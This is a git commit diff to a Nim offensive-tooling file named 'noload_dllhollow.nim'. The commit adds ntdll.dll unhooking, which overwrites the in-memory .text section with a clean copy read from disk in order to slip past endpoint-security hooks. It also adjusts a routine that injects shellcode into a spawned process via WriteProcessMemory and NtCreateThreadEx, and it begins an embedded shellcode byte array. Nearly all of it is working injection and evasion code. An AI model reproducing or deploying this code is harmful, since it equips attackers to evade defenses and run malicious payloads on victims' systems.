1eba2efbaf903f58b176904e15c3cc9e6cc0117c
zimnyaa <ilya.aksyonenko@gmail.com>
2022-01-31 17:41:23 +0200

    Update noload_dllhollow.nim
    add unhooking (FreshCopy, with syscalls)

--- noload_dllhollow.nim
+++ noload_dllhollow.nim
@@ -4,6 +4,69 @@ import strformat
 import strutils
 import os
 
+import ptr_math
+
+proc toString(bytes: openarray[byte]): string =
+  result = newString(bytes.len)
+  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)
+
+
+# the code below courtesy of byt3bl33d3r, adapted to use syscalls
+proc ntdll_mapviewoffile() =
+  let low: uint16 = 0
+  var 
+      processH = GetCurrentProcess()
+      mi : MODULEINFO
+      ntdllModule = GetModuleHandleA("ntdll.dll")
+      ntdllBase : LPVOID
+      ntdllFile : FileHandle
+      ntdllMapping : HANDLE
+      ntdllMappingAddress : LPVOID
+      hookedDosHeader : PIMAGE_DOS_HEADER
+      hookedNtHeader : PIMAGE_NT_HEADERS
+      hookedSectionHeader : PIMAGE_SECTION_HEADER
+
+  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
+  ntdllBase = mi.lpBaseOfDll
+
+
+  ntdllFile = getOsFileHandle(open("C:\\windows\\system32\\ntdll.dll",fmRead))
+  ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
+  
+
+  if ntdllMapping == 0:
+    echo fmt"Could not create file mapping object ({GetLastError()})."
+    return
+  
+
+  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
+  if ntdllMappingAddress.isNil:
+    echo fmt"Could not map view of file ({GetLastError()})."
+    return
+
+
+  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
+  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
+  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
+      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
+      if ".text" in toString(hookedSectionHeader.Name):
+          var oldProtection : DWORD = 0
+          var text_addr : LPVOID = ntdllBase + hookedSectionHeader.VirtualAddress
+          var sectionSize: SIZE_T = cast[SIZE_T](hookedSectionHeader.Misc.VirtualSize)
+
+          var status = NtProtectVirtualMemory(processH, addr text_addr, &sectionSize, PAGE_EXECUTE_READWRITE, addr oldProtection)
+          echo "[*] NtProtectVirtualMemory(RWX): ", RtlNtStatusToDosError(status)
+          copyMem(text_addr, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
+          status = NtProtectVirtualMemory(processH, addr text_addr, &sectionSize, oldProtection, addr oldProtection)
+          echo "[*] NtProtectVirtualMemory(oldprotect): ", RtlNtStatusToDosError(status)
+
+
+  CloseHandle(processH)
+  CloseHandle(ntdllFile)
+  CloseHandle(ntdllMapping)
+  FreeLibrary(ntdllModule)
+          
+
 const
     PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE = 0x00000003 shl 44 #Gr33tz to @_RastaMouse ;)
     PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON = 0x00000001 shl 36
@@ -107,8 +170,6 @@ proc splwow_crt(shellcode: openarray[byte]): void =
   var pHandle = pi.hProcess
   var tHandle = pi.hThread
 
-  echo "suspending the main thread..."
-  discard NtSuspendThread(tHandle, NULL)
 
   var modulebuf: array[255, HMODULE]
   var cb : DWORD = 255*sizeof(HMODULE)
@@ -149,11 +210,12 @@ proc splwow_crt(shellcode: openarray[byte]): void =
     pHandle, 
     base_addr, 
     unsafeAddr shellcode[0], 
-    sc_size, 
+    cast[SIZE_T](shellcode.len), 
     &bytesWritten);
   echo "[*] WriteProcessMemory: ", RtlNtStatusToDosError(status)
-  echo "    \\-- bytes written: ", bytesWritten
+  echo "    \\-- bytes written: ", bytesWritten, " with sc_size ", cast[SIZE_T](shellcode.len)
   echo ""
+  
   status = NtProtectVirtualMemory(
     pHandle,
     addr base_addr,
@@ -162,7 +224,7 @@ proc splwow_crt(shellcode: openarray[byte]): void =
     &oldprotect
   ) 
   echo "[*] ProtectVirtualMemory: ", RtlNtStatusToDosError(status)
-  
+   
   var inj_handle: HANDLE
 
   status = NtCreateThreadEx(
@@ -179,8 +241,6 @@ proc splwow_crt(shellcode: openarray[byte]): void =
     NULL);
   echo "[*] NtCreateThreadEx: ", RtlNtStatusToDosError(status)
 
-  status = NtResumeThread(tHandle, NULL);
-  echo "[*] NtResumeThread: ", RtlNtStatusToDosError(status)
 
   status = NtClose(tHandle)
   status = NtClose(pHandle)
@@ -192,6 +252,8 @@ proc splwow_crt(shellcode: openarray[byte]): void =
 
 
 when isMainModule:
+
+  ntdll_mapviewoffile()
   var shellcode: array[295, byte] = [
         byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
         0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
